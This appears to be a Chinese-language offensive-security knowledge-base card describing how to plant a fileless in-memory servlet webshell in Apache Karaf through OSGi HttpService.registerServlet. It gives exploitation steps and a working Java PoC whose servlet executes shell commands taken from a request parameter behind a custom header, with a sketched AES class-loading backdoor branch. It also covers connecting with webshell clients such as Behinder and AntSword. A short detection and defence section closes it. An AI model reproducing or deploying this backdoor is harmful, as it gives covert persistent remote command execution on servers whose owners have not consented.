---
id: web-java-component-karaf-osgi-httpservice-servlet-memshell
title: Karaf/OSGi HttpService 注册内存 Servlet WebShell：BundleActivator 跟踪 HttpService 后 registerServlet
type: scenario
domain: web
path: web/java/component
technique: osgi-httpservice-servlet-memshell
aliases:
- OSGi 内存马
- Karaf Servlet 内存马
- HttpService registerServlet
- OSGi HttpService 后门
- Karaf 无文件 WebShell
tags:
- java
- karaf
- osgi
- httpservice
- servlet
- memshell
- jetty
- webshell
- persistence
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V224
  verified_at: '2026-11-07T06:44:33+08:00'
  notes: '已对照 content.md 与 12/12 张图核对：ServiceTracker 获取 org.osgi.service.http.HttpService、registerServlet(''/hello'', HelloServlet)、HelloServlet 的 x-client-data: cmd 命令执行与 uyhasudg AES/defineClass 分支、/system/console/http 新增 HelloServlet、冰蝎连 /hello 均与原文一致；原文仅以 Karaf 4.0.4 为测试环境且前提是 http feature，已 clear affected_versions。与 web-java-classloader-jsp-memory-servlet-webshell、Tomcat StandardContext、Jetty11 ThreadLocal 卡 dedup 均为 related，容器/注册 API 不同，保留。未验证点：PoC 未本机复跑；原文实战环境内存马未打通，仅本地复现。'
---

## 一句话结论

在能安装并启动 OSGi bundle 的前提下（如 Karaf Web Console 后台 bundle 上传），让 `BundleActivator.start()` 用 `ServiceTracker` 获取 Karaf 的 `org.osgi.service.http.HttpService`，调用 `registerServlet("/hello", new HelloServlet(), null, null)` 把恶意 Servlet 直接注册进 Jetty；Servlet 常驻内存、不落盘 JSP/class 文件，通过自定义请求头触发命令执行或 AES 加密的类加载 WebShell，实现对 Karaf 的隐蔽持久控制。

## 原理

- Karaf 的 `http` feature 用 Jetty 提供 HTTP 服务，并把 `HttpService` 注册为 OSGi 服务。任何 bundle 都可以通过 `BundleContext` 获取该服务；`HttpService.registerServlet(alias, servlet, initParams, httpContext)` 会把 Servlet 挂到 Jetty 的上下文路径上。
- `BundleActivator.start()` 在 bundle 启动时执行，拥有当前 bundle 的类加载器和完整 Java 权限；在其中用 `ServiceTracker` 跟踪 `HttpService`，等服务可用后注册 Servlet。因为注册动作发生在运行时，磁盘上只有合法 bundle JAR（甚至可只在内存加载），没有新增 WAR/JSP，传统文件查杀与部署目录监控难以发现。
- 注册后的 Servlet 由 Jetty 直接调用，生命周期跟随 bundle；只要 bundle 不停止，访问 `/hello` 就进入攻击者代码。Servlet 可以复用容器已有的请求/响应对象，不需要额外开端口，流量与正常 Web Console 同端口。
- 文章中的 Servlet 支持两条路径：`x-client-data: cmd` + `cmd` 参数直接 `Runtime.exec` 并回显；`x-client-data: uyhasudg` 走 AES 解密 + 反射 `ClassLoader.defineClass` 的冰蝎式内存马逻辑，动态加载后续字节码。
- 注册成功后，Karaf Web Console 的 `Http` 页面（`/system/console/http`）会列出新增的 `HelloServlet` 与 `/hello` 别名，可作为部署是否成功的旁证；这也意味着管理员可通过该页面发现异常 Servlet。

## 触发条件

- 攻击者能向 Karaf 安装并启动任意 OSGi bundle（例如通过默认口令登录 Web Console 的 `Upload / Install Bundles`，或已有的 bundle 部署权限）。
- Karaf 已安装 `http` feature，`HttpService` 服务存在；Web Console 本身通常也依赖 HTTP 服务。
- 目标路径（如 `/hello`）未被占用；Servlet API 与 OSGi HttpService 包在 bundle 的 `Import-Package` 中可解析。
- Servlet 代码使用的类（`javax.servlet.*`、`org.osgi.service.http.*`）在 Karaf 运行时可用；若用冰蝎/AES 逻辑，还需对应加密库可加载。

## 利用步骤

1. 准备一个 OSGi bundle，`MANIFEST.MF` 指定 `Bundle-Activator`，并导入 `org.osgi.service.http`、`javax.servlet`、`org.osgi.util.tracker` 等包。
2. 在 `Activator.start()` 中创建 `ServiceTracker<HttpService, HttpService>`，在 `addingService` 回调里取得 `HttpService` 并 `registerServlet("/hello", new HelloServlet(), null, null)`。
3. `HelloServlet.doPost` 中按请求头分流：命令执行分支读取 `cmd` 参数，用 `Runtime.getRuntime().exec(new String[]{"sh","-c",cmd})` 或 `cmd.exe /c` 执行并回显；加密分支用固定密钥 AES 解密请求体，反射调用 `ClassLoader.defineClass` 加载字节码并实例化。
4. 打包 bundle 并上传/安装，勾选启动；bundle 启动后访问 `/hello` 验证。
5. 在 Web Console 的 `Http` 页面确认新增 Servlet 与 `/hello` 别名；用蚁剑/冰蝎等客户端连接 `http://host:8181/hello`（Web Console 需要认证时带上 `Authorization: Basic ...` 头）。
6. 后续通过该 Servlet 执行命令、加载新字节码；bundle 停止或 Karaf 重启后内存马消失，需重新部署。

## PoC

```java
// Activator：跟踪 HttpService 并注册 Servlet
public class Activator implements BundleActivator {
    private ServiceTracker<HttpService, HttpService> tracker;

    public void start(BundleContext ctx) throws Exception {
        tracker = new ServiceTracker<>(ctx, HttpService.class.getName(),
            new ServiceTrackerCustomizer<HttpService, HttpService>() {
                public HttpService addingService(ServiceReference<HttpService> ref) {
                    HttpService http = ctx.getService(ref);
                    try {
                        http.registerServlet("/hello", new HelloServlet(), null, null);
                    } catch (Exception e) { e.printStackTrace(); }
                    return http;
                }
                public void modifiedService(ServiceReference<HttpService> r, HttpService s) {}
                public void removedService(ServiceReference<HttpService> r, HttpService s) {
                    s.unregister("/hello");
                    ctx.ungetService(r);
                }
            });
        tracker.open();
    }
    public void stop(BundleContext ctx) throws Exception { tracker.close(); }
}

// Servlet：命令执行/加密类加载二合一
public class HelloServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String mode = req.getHeader("x-client-data");
        if ("cmd".equalsIgnoreCase(mode) && req.getParameter("cmd") != null) {
            String cmd = req.getParameter("cmd");
            boolean win = System.getProperty("os.name").toLowerCase().contains("win");
            Process p = Runtime.getRuntime().exec(win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"sh", "-c", cmd});
            Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
            resp.getWriter().write(s.hasNext() ? s.next() : "");
        } else if ("uyhasudg".equalsIgnoreCase(mode)) {
            // 冰蝎式：AES 解密请求体 -> 反射 ClassLoader.defineClass -> newInstance
        }
    }
}
```

最小 `MANIFEST.MF` 需包含 `Bundle-Activator: com.blogspot.developmentor.Activator`、`Bundle-SymbolicName`、`Bundle-Version`，并 `Import-Package: org.osgi.framework,org.osgi.service.http,org.osgi.util.tracker,javax.servlet,javax.servlet.http`。

## 变体与关联

- 变体：不注册 Servlet，改用 `sun.misc.Unsafe.defineClass`/`defineAnonymousClass` + jmg 生成 Jetty Filter 内存马；连接时需带 Web Console 的 Basic 认证头。该环境里冰蝎/哥斯拉曾报 `NoClassDefFoundError: javax/crypto/Cipher`，蚁剑可连通。
- 变体：把命令执行逻辑换成 AES 加密的类加载器 WebShell（冰蝎/哥斯拉协议），或注册 Filter 拦截所有请求。
- 关联：[[web-java-component-karaf-webconsole-default-login-bundle-upload-rce]]（获得 bundle 安装权限的入口）、[[web-java-classloader-jsp-memory-servlet-webshell]]（反射注册 Servlet 内存马）、[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]（Unsafe 匿名类内存马）、[[web-java-component-jetty11-threadlocal-header-memshell]]（Jetty 内存马）。
- 边界：bundle 停止/Karaf 重启后 Servlet 消失；需要 HttpService 与 Servlet API 可用；Web Console 的 Http 页面会暴露新增 Servlet 与别名；Servlet 类加载器随 bundle 生命周期，bundle 更新可能导致类不兼容。

## 检测与防御

- 检测：Karaf Web Console `/system/console/http` 出现未知 Servlet、别名或来源 bundle；Karaf 日志出现 `registerServlet`、新 bundle 启动与 `Bundle-Activator` 加载；Jetty 访问日志出现固定路径（如 `/hello`）与异常请求头（`x-client-data`）；对同一路径的 POST 请求携带 `cmd` 参数或加密二进制体。
- 检测：内存中出现由 bundle 类加载器定义的 Servlet/Filter 类，但磁盘 bundle 中无对应类或类名混淆；bundle 列表与基线比对出现来源不明、无签名的新 bundle。
- 防御：保护 Web Console（强口令、内网、反向代理鉴权），禁止不必要的 bundle 上传/安装；只允许签名且白名单来源的 bundle；安装 `http` feature 时限制可注册 Servlet 的 bundle；启用 OSGi 安全层/权限模型，限制 bundle 的 `Runtime.exec` 与反射能力；定期审计 `/system/console/http` 与 bundle 清单。
- 加固：生产环境关闭 Web Console 或改为只读；对 Karaf 进程使用最小权限账户；监控子进程与网络连接；保留 bundle 安装/启动审计日志。
